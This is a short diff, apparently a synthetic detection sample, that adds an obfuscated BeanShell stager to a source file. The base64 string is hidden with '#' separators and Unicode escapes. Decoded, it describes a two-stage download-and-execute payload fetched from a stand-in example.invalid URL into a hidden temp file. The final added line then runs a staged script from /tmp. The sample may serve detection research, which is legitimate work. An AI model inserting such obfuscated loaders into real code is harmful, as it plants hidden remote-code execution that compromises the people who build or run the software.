@@ -1,0 +1,4 @@
+String enc = \u0022dj0zfGxhb#md1YWdlPW#JlYW5zaGV#sbHxyb2xl#PXN0YWdlc#nx2ZXJkaW#N0PW1hbGl#jaW91c3xh#\u0022 \u002b
+    \u0022dHRhY2s9V#DEwNTl8YW#RhcHRlcj1#idWlsZF9l#eGVjfGhvc#3RfcHJvZm#lsZT1zdGF#uZGFsb25l#fG9iZnVzY#2F0aW9uX3#Byb2ZpbGU#9YjY0fHN0#YWdlX3Byb#2ZpbGU9dH#dvX3N0YWd#lX2Rvd25s#b2FkX2V4Z#WN1dGV8bm#V4dF9sYW5#ndWFnZT1i#YXNofHN0Y#WdlX2NvdW#50PTJ8c3R#lcHM9ZmV0#Y2hfc3RhZ#2UscnVuX3#N0YWdlfGN#hbXBhaWdu#X2lkPUtCL#WRiMTQ3NT#AzfHVybD1#odHRwczov#L2tiLWRiM#TQ3NTAzMT#kuZXhhbXB#sZS5pbnZh#bGlkL3N0Y#WdlfGZpbG#VfcGF0aD0#vdmFyL3Rt#cC9odW50c#mVzcy1rYi#8uMTkwM2F#hZjk1ZjE3#ZDRkMS5zd#GFnZQ==\u0022;
+String descriptor_d8da9648 = enc.replace("#", "");
+source("/tmp/huntress-kb/stage.bsh");
